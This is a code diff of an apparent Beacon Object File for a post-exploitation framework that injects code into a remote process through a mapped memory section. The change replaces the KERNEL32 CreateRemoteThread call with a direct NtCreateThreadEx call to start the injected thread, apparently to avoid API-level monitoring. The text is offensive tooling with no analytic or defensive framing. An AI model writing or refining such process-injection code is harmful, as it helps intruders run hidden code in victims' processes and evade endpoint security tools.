@@ -6,8 +6,6 @@
 
 #define NT_SUCCESS 0x00000000
 
-WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
-
 
 void go(char * args, int len) {
     datap parser;
@@ -23,6 +21,7 @@ void go(char * args, int len) {
 
     HANDLE hLocalProcess = NULL;
     HANDLE hRemoteProcess = NULL;
+    HANDLE hRemoteThread = NULL;
     HANDLE hSection = NULL;
     HANDLE baseAddrRemote = NULL;
     HANDLE baseAddrLocal = NULL;
@@ -88,5 +87,5 @@ void go(char * args, int len) {
     } 
 
     // Create thread
-    HANDLE hThread = KERNEL32$CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE) baseAddrRemote, NULL, 0, NULL);
+    NtCreateThreadEx(&hRemoteThread, 0x1FFFFF, NULL, hRemoteProcess, (LPTHREAD_START_ROUTINE)baseAddrRemote, NULL, FALSE, NULL, NULL, NULL, NULL);
 }
